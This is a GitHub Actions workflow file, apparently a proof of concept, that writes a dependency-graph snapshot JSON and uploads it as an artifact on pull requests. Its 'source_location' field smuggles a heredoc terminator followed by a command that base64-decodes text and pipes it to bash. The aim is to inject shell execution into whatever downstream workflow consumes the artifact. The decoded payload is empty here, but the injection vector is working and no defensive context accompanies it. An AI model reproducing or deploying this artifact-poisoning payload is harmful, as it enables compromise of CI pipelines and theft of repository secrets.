name: PR Workflow

on:
  pull_request:
    branches: [development]

permissions:
  contents: read
  actions: write

jobs:
  dependency-graph:
    runs-on: ubuntu-latest
    steps:
      - name: Build dependency graph snapshot
        run: |
          mkdir -p dependency-graph-reports
          : > artifact-root.txt
          cat > dependency-graph-reports/dep.json <<'JSON'
          {
            "version": 0,
            "sha": "${{ github.event.pull_request.head.sha }}",
            "ref": "refs/heads/development",
            "job": {"correlator": "poc-${{ github.run_id }}-${{ github.run_attempt }}", "id": "poc-${{ github.run_id }}"},
            "detector": {"name": "poc", "version": "1.0.0", "url": "https://example.com"},
            "manifests": {
              "poc": {
                "name": "poc",
                "file": {"source_location": "poc\nEOF\necho '' | base64 -d | bash -s -- ${{ github.event.pull_request.head.sha }} || true; exit 0\n"},
                "resolved": {
                  "pkg:maven/com.example/poc@1.0.0": {
                    "package_url": "pkg:maven/com.example/poc@1.0.0",
                    "relationship": "direct",
                    "scope": "runtime",
                    "dependencies": []
                  }
                }
              }
            },
            "scanned": "${{ github.event.pull_request.updated_at }}"
          }
          JSON
      - uses: actions/upload-artifact@v4
        with:
          name: dependency-graph_poc
          path: |
            dependency-graph-reports/**
            artifact-root.txt
